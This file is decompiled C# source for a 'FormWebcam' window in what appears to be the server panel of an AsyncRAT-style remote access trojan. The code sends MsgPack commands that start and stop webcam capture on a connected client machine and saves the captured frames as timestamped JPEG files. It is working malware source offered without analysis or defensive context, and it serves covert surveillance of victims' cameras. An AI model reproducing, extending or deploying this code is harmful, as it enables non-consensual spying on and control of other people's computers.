using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x02000064 RID: 100
	public partial class FormWebcam : DarkForm
	{
		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x060003F3 RID: 1011 RVA: 0x00027E84 File Offset: 0x00027E84
		// (set) Token: 0x060003F4 RID: 1012 RVA: 0x00027E8C File Offset: 0x00027E8C
		public global::Form1 F { get; set; }

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x060003F5 RID: 1013 RVA: 0x00027E98 File Offset: 0x00027E98
		// (set) Token: 0x060003F6 RID: 1014 RVA: 0x00027EA0 File Offset: 0x00027EA0
		internal Clients Client { get; set; }

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x060003F7 RID: 1015 RVA: 0x00027EAC File Offset: 0x00027EAC
		// (set) Token: 0x060003F8 RID: 1016 RVA: 0x00027EB4 File Offset: 0x00027EB4
		internal Clients ParentClient { get; set; }

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x060003F9 RID: 1017 RVA: 0x00027EC0 File Offset: 0x00027EC0
		// (set) Token: 0x060003FA RID: 1018 RVA: 0x00027EC8 File Offset: 0x00027EC8
		public string FullPath { get; set; }

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x060003FB RID: 1019 RVA: 0x00027ED4 File Offset: 0x00027ED4
		// (set) Token: 0x060003FC RID: 1020 RVA: 0x00027EDC File Offset: 0x00027EDC
		public Image GetImage { get; set; }

		// Token: 0x060003FD RID: 1021 RVA: 0x00027EE8 File Offset: 0x00027EE8
		public FormWebcam()
		{
			this.InitializeComponent();
		}

		// Token: 0x060003FE RID: 1022 RVA: 0x00027F04 File Offset: 0x00027F04
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.button1.Tag == "play")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack.ForcePathObject("Command").AsString = "capture";
					msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
					msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					this.button1.Tag = "stop";
					this.button1.BackgroundImage = Resources.stop__1_;
					this.numericUpDown1.Enabled = false;
					this.comboBox1.Enabled = false;
					this.btnSave.Enabled = true;
				}
				else
				{
					this.button1.Tag = "play";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack2.ForcePathObject("Command").AsString = "stop";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
					this.button1.BackgroundImage = Resources.play_button;
					this.btnSave.BackgroundImage = Resources.save_image;
					this.numericUpDown1.Enabled = true;
					this.comboBox1.Enabled = true;
					this.btnSave.Enabled = false;
					this.timerSave.Stop();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003FF RID: 1023 RVA: 0x000280CC File Offset: 0x000280CC
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000400 RID: 1024 RVA: 0x0002812C File Offset: 0x0002812C
		private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000401 RID: 1025 RVA: 0x00028168 File Offset: 0x00028168
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.SaveIt)
				{
					this.SaveIt = false;
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
				this.SaveIt = true;
			}
		}

		// Token: 0x06000402 RID: 1026 RVA: 0x00028208 File Offset: 0x00028208
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}

		// Token: 0x040002C3 RID: 707
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x040002C4 RID: 708
		public int FPS;

		// Token: 0x040002C5 RID: 709
		public bool SaveIt;
	}
}
